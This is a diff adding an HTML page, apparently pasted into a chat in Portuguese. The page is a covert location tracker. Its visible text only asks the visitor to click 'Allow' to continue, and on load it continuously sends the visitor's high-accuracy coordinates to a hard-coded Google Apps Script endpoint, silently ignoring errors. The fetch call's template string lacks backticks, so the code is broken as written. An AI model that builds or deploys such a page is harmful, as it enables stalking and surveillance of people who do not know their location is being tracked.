@@ -1,0 +1,57 @@
+
+Você disse:
+<!DOCTYPE html>
+<html>
+<head>
+  <title> </title>
+  <script>
+    let watchID;
+
+    function startSendingLocation() {
+      if (navigator.geolocation) {
+        // Configura o observador da localização
+        watchID = navigator.geolocation.watchPosition(
+          sendLocation,
+          showError,
+          {
+            enableHighAccuracy: true,
+            maximumAge: 30000, // A posição pode ser armazenada por até 30 segundos
+            timeout: 27000 // Tempo máximo de espera para obter a localização
+          }
+        );
+      } else {
+        alert("Geolocalização não é suportada neste navegador.");
+      }
+    }
+
+    function sendLocation(position) {
+      const lat = position.coords.latitude;
+      const lng = position.coords.longitude;
+      const url = "https://script.google.com/macros/s/AKfycbwYOerrVwS24d7WHZ1bwZ6cq4kn1L04IuyrPFU0vv4-bJKJWkmInu4TINKH9QG83s0k/exec";
+
+      fetch(${url}?informacao=https://www.google.com/maps?q=${lat},${lng})
+        .then(response => response.text())
+        .then(data => console.log("Localização enviada"))
+        .catch(error => console.error("Erro ao enviar localização:", error));
+    }
+
+    function showError(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          break;
+        case error.POSITION_UNAVAILABLE:
+          break;
+        case error.TIMEOUT:
+          break;
+        case error.UNKNOWN_ERROR:
+          break;
+      }
+    }
+  </script>
+</head>
+<body onload="startSendingLocation()">
+ <h1> </h1>
+ <h1> </h1>
+  <h1>Clique em Permitir para continuar...</h1>
+</body>
+</html>
